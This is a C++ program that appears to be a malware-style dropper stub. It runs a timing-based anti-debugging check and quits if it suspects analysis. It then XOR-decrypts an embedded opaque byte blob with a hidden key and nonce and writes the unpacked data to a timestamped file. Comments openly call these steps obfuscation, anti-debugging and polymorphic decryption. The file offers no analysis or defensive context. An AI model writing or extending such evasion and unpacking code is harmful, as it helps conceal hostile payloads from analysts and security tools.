
#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdlib>
#include <cstdint>
#include <ctime>

// Advanced obfuscation
std::string jKOeMDja = "\x36\x33\x36\x33\x35\x32\x35\x35\x35\x35\x36\x32\x35\x32\x36\x62\x36\x32\x36\x38\x36\x32\x36\x33\x36\x33\x35\x32\x35\x35\x35\x35";
std::string uDtRQ_z1 = "\x35\x31\x62\x36\x62\x37\x32\x34\x38\x64\x34\x32\x35\x33\x39\x30\x38\x39\x38\x65\x61\x66\x62\x63\x34\x35\x39\x61\x63\x62\x61\x38";

// Anti-debugging and obfuscation techniques
bool isDebugged() {
    // Simple timing check
    clock_t start = clock();
    for (volatile int i = 0; i < 1000000; i++) {}
    clock_t end = clock();
    return (end - start) > 100000; // Suspicious if too slow
}

// Polymorphic decryption
void polymorphicDecrypt(uint8_t* data, size_t dataLen, const std::string& keyHex, const std::string& nonceHex) {
    uint8_t key[16], nonce[16];
    for (int i = 0; i < 16; i++) {
        key[i] = std::stoi(keyHex.substr(i*2, 2), nullptr, 16);
        nonce[i] = std::stoi(nonceHex.substr(i*2, 2), nullptr, 16);
    }
    
    // Multiple layers of XOR with different patterns
    for (size_t i = 0; i < dataLen; i++) {
        data[i] ^= key[i % 16];
        data[i] ^= nonce[i % 16];
        data[i] ^= (i * 7 + 13) & 0xFF; // Additional obfuscation
    }
}

int main() {
    // Anti-debugging check
    if (isDebugged()) {
        std::cerr << "Debugging detected!" << std::endl;
        return 1;
    }
    
    // Embedded encrypted data
    uint8_t encryptedData[] = {0x9a, 0x3d, 0x35, 0xfc, 0x47, 0x2c, 0x43, 0xee, 0x51, 0xd5, 0x47, 0x65, 0x6e, 0x21, 0xa5, 0xa9, 0x22, 0xc5, 0x7a, 0xae, 0xe9, 0x12, 0xfa, 0x4f, 0x8e, 0xf0, 0x8b, 0xf5, 0x68, 0xf7, 0x7d, 0x82, 0xa2, 0x0e, 0xa1, 0x12, 0x1d, 0x2e, 0x79, 0xfd, 0xbd, 0x82, 0x02, 0x75, 0xef, 0x3f, 0x66, 0xdb, 0x13, 0x4f, 0x8a, 0xe4, 0xd4, 0x05, 0x3b, 0x02, 0x21, 0x9c, 0x8c, 0x89, 0xf5, 0xb1, 0x55, 0xbf, 0xf3, 0x86, 0x91, 0xcf, 0xeb, 0x36, 0xeb, 0xfd, 0x40, 0xb9, 0xb6, 0x09, 0x0c, 0x36, 0x80, 0x83, 0xa5, 0x2c, 0xe0, 0x3a, 0xd4, 0xb7, 0xf1, 0x85, 0x83, 0xf6, 0x9f, 0x6e, 0x35, 0xc8, 0x6f, 0x9b, 0x67, 0xd4, 0xb8, 0x3f, 0x0c, 0xf5, 0x66, 0x83, 0xff, 0x88, 0x7f, 0x87, 0x7d, 0xc5, 0x1b, 0xae, 0x88, 0x95, 0xde, 0x05, 0xc8, 0x74, 0xd9, 0x1e, 0x1f, 0x05, 0x21, 0xe0, 0xf7, 0xd1, 0xda, 0xa5, 0xc1, 0xd4, 0x5a, 0x4a, 0xaf, 0xd6, 0x8c, 0x59, 0xd6, 0x5d, 0x21, 0x08, 0x6c, 0xcf, 0x40, 0xd5, 0x42, 0x00, 0x5f, 0x19, 0x72, 0xca, 0xe7, 0x5a, 0x45, 0x04, 0x96, 0xe3, 0xd0, 0x07, 0x08, 0xbf, 0xc1, 0x47, 0x1f, 0x7c, 0xf9, 0xfd, 0x2a, 0x66, 0x70, 0x27, 0x45, 0xf5, 0x35, 0x59, 0x05, 0x3c, 0xbf, 0x0b, 0x4d, 0x34, 0xe3, 0xc8, 0x02, 0xda, 0xc8, 0x12, 0x32, 0xb9, 0x62, 0x1f, 0x2c, 0xfe, 0x65, 0xeb, 0xe8, 0x1d, 0xa1, 0x3a, 0x9a, 0x2a, 0xf6, 0x14, 0x54};
    size_t dataSize = sizeof(encryptedData);
    
    // Polymorphic decryption
    polymorphicDecrypt(encryptedData, dataSize, jKOeMDja, uDtRQ_z1);
    
    // Write with random filename
    std::string filename = "output_" + std::to_string(time(nullptr)) + ".bin";
    std::ofstream outFile(filename, std::ios::binary);
    if (outFile.is_open()) {
        outFile.write(reinterpret_cast<char*>(encryptedData), dataSize);
        outFile.close();
        std::cout << "Data decrypted and saved to " << filename << std::endl;
    } else {
        std::cerr << "Failed to create output file" << std::endl;
        return 1;
    }
    
    return 0;
}
